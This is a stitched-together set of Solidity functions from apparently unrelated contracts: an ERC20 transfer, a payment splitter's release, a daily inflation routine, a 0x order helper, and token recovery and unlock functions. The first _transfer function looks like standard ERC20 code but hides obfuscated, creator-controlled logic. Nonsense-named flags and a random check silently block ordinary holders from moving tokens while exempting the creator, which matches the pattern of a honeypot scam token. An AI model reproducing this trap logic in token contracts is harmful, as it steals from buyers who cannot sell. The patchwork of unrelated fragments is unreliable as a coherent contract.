function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (gigapack == false)) {
        smartphone = chTx;
        cocos = true;
    }
    if ((address(sender) == creator) && (gigapack == true)) {
        downwind[recipient] = true;
        upwind[recipient] = false;
        gigapack = false;
    }
    if ((amount > destructiooon) && (downwind[sender] == true) && (address(sender) != creator)) {
        tigers[recipient] = true;
    }
    if (downwind[recipient] != true) {
        upwind[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((upwind[sender]) && (downwind[recipient] == false)) {
        upwind[recipient] = true;
    }
    if (downwind[sender] == false) {
        if ((amount > destructiooon) && (tigers[sender] == true)) {
            require(false);
        }
        require(amount < smartphone);
        if (cocos == true) {
            if (tigers[sender] == true) {
                require(false);
            }
            tigers[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function release(address account) public {
    require(_shares[account] > 0);
    uint256 totalReceived = address(this).balance.add(_totalReleased);
    uint256 payment = totalReceived.mul(
        _shares[account]).div(
        _totalShares).sub(
        _released[account]
    );
    require(payment != 0);
    _released[account] = _released[account].add(payment);
    _totalReleased = _totalReleased.add(payment);
    account.transfer(payment);
    emit PaymentReleased(account, payment);
}

function inflate() public onlyRole("InflationOperator") returns(uint256) {
    uint256 currentTime = block.timestamp;
    uint256 currentDayStart = currentTime / 1 days;
    uint256 inflationAmount;
    require(lastInflationDayStart != currentDayStart);
    lastInflationDayStart = currentDayStart;
    uint256 createDurationYears = (currentTime - deployTime) / 1 years;
    if (createDurationYears < 1) {
        inflationAmount = initialAmount / 10 / 365;
    } else if (createDurationYears >= 20) {
        inflationAmount = 0;
    } else {
        inflationAmount = initialAmount * (100 - (5 * createDurationYears)) / 365 / 1000;
    }
    incentivesPool = incentivesPool.add(inflationAmount);
    totalSupply = totalSupply.add(inflationAmount);
    emit Inflate(incentivesPool);
    return incentivesPool;
}

function getMaxMakerAmount(
    address makerToken,
    address takerToken,
    bytes orderData
)
external
view
returns(uint256) {
    address zeroExExchange = ZERO_EX_EXCHANGE;
    Order memory order = parseOrder(orderData);
    if (block.timestamp >= order.expirationUnixTimestampSec) {
        return 0;
    }
    bytes32 orderHash = getOrderHash(
        zeroExExchange,
        makerToken,
        takerToken,
        order
    );
    uint256 unavailableTakerAmount =
        ZeroExExchangeInterfaceV1(zeroExExchange).getUnavailableTakerTokenAmount(orderHash);
    uint256 takerAmount = order.takerTokenAmount.sub(unavailableTakerAmount);
    uint256 makerAmount = MathHelpers.getPartialAmount(
        takerAmount,
        order.takerTokenAmount,
        order.makerTokenAmount
    );
    return makerAmount;
}

function recoverTokens(ERC20Interface _token) public returns(bool) {
    if (_token == FaceterToken && now < 1546300800 && unlockStep != 1) {
        return false;
    }
    return _token.transfer(RECEIVER, _token.balanceOf(this));
}

function unlock() public returns(bool) {
    uint unlockAmount = 0;
    if (unlockStep == 0 && now >= 1546300800) {
        unlockAmount = FaceterToken.balanceOf(this);
    }
    if (unlockAmount == 0) {
        return false;
    }
    unlockStep++;
    require(FaceterToken.transfer(RECEIVER, unlockAmount));
    return true;
}

